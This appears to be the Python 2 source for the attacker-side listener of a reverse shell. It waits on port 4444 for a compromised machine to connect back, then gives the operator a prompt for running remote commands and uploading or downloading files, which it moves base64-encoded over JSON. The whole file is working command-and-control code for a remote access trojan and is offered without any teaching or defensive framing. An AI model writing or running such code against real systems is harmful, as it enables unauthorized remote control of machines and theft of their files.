import socket,json,shlex,base64,sys,os,shutil,subprocess

class Listener:
    def __init__(self,ip,port):

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_IP, socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for Connection")
        self.connection, target_address = listener.accept()
        print("[+] Got a Connection from " + str(target_address))


    def send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)

    def recieve(self):
        json_data=""
        while True:
            try:
                json_data = json_data+self.connection.recv(10000000)
                return json.loads(json_data)
            except ValueError:
                continue



    def execute(self,command):
        self.send(command)
        if command[0]=="exit":
            self.connection.close()
            sys.exit()
        return self.recieve()

    def write(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())


    def run(self):
        while True:
            command = raw_input("Roy>> ")
            command=shlex.split(command)
            try:
                if command[0]=="upload":
                    content=self.read_file(command[1])
                    command.append(content)
                result = self.execute(command)

                if command[0]=="download" and "[+] Error" not in result:
                    result=self.write(command[1],result)
            except Exception:
                result = "[+] Error during command execution"

            print(result)


listener=Listener("192.168.43.201",4444)
listener.run()



